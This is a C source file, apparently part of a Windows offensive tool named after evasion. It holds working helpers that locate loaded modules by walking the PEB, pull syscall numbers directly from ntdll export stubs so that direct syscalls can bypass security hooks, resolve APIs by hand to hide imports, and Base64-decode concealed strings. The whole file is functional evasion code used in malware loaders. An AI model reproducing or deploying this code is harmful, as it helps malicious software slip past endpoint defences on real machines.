#include "evasion.h"
#include <wincrypt.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

//GetModuleBaseAddress
PVOID GetModBA(LPCWSTR moduleName) {
    PPEB pPeb = (PPEB)__readgsqword(0x60); // 0x60 is PEB offset for x64
    PPEB_LDR_DATA pLdr = pPeb->Ldr;
    PLIST_ENTRY pListEntry = &pLdr->InMemoryOrderModuleList;

    for (PLIST_ENTRY pEntry = pListEntry->Flink; pEntry != pListEntry; pEntry = pEntry->Flink) {
        PLDR_DATA_TABLE_ENTRY pDataTableEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        // Extract the base name from the FullDllName
        LPCWSTR fullDllName = pDataTableEntry->FullDllName.Buffer;
        LPCWSTR baseDllName = wcsrchr(fullDllName, L'\\');
        baseDllName = (baseDllName != NULL) ? (baseDllName + 1) : fullDllName;

        if (wcsicmp(baseDllName, moduleName) == 0) {
            return pDataTableEntry->DllBase;
        }
    }
    return NULL;
}

DWORD GetSyid(LPCSTR functionName) {
    PVOID ntdllBase = GetModBA(L"ntdll.dll");
    if (!ntdllBase) return 0;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ntdllBase;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ntdllBase + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)ntdllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* addressOfFunctions = (DWORD*)((BYTE*)ntdllBase + exportDir->AddressOfFunctions);
    DWORD* addressOfNames = (DWORD*)((BYTE*)ntdllBase + exportDir->AddressOfNames);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)ntdllBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR name = (LPCSTR)((BYTE*)ntdllBase + addressOfNames[i]);
        if (strcmp(name, functionName) == 0) {
            DWORD functionRVA = addressOfFunctions[addressOfNameOrdinals[i]];
            BYTE* functionPtr = (BYTE*)ntdllBase + functionRVA;
            // Syscall ID is stored at byte 4 (mov eax, XX)
            return *(DWORD*)(functionPtr + 4);
        }
    }
    return 0;
}

void SetSyid(DWORD value) {
    smID = value;
}

// Function to Resolve APIs
FARPROC ResolveFn(LPCSTR mod, LPCSTR fn) {
    HMODULE hMod = GetModuleHandle(mod);
    if (!hMod) return NULL;

    IMAGE_DOS_HEADER* dosHdr = (IMAGE_DOS_HEADER*)hMod;
    IMAGE_NT_HEADERS* ntHdr = (IMAGE_NT_HEADERS*)((BYTE*)hMod + dosHdr->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* expDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hMod + ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = (DWORD*)((BYTE*)hMod + expDir->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + expDir->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + expDir->AddressOfFunctions);

    for (DWORD i = 0; i < expDir->NumberOfNames; i++) {
        LPCSTR currFn = (LPCSTR)((BYTE*)hMod + names[i]);
        if (strcmp(currFn, fn) == 0) {
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
        }
    }
    return NULL;
}

// Function to Base64 Decode
char* Bsfd(const char* encoded) {
    DWORD outLen = 0;
    BYTE* decoded = NULL;
    
    // Get the required output buffer size
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, NULL, &outLen, NULL, NULL)) {
        return NULL;
    }

    // Allocate buffer
    decoded = (BYTE*)malloc(outLen + 1);
    if (!decoded) return NULL;

    // Perform the decoding
    if (!CryptStringToBinaryA(encoded, 0, CRYPT_STRING_BASE64, decoded, &outLen, NULL, NULL)) {
        free(decoded);
        return NULL;
    }

    decoded[outLen] = '\0';  // Null-terminate the string
    return (char*)decoded;
}
